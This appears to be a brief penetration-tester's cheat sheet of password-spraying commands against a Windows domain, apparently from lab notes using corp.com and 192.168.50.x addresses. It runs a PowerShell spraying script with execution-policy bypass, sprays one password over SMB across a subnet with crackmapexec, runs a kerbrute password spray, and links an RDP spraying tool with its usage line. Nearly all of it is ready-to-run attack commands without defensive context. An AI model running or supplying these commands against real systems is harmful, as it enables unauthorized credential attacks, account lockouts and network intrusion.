# Powershell

https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
```bash
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```
-----------------------

# Crackmapexec
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
crackmapexec smb 192.168.50.0/24 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

-----------------------

# Kerbrute
```bash
kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

-----------------------

# RDP
https://github.com/xFreed0m/RDPassSpray
```bash
rdppass -U users.txt -p password -T external_targets.txt
```

-----------------------
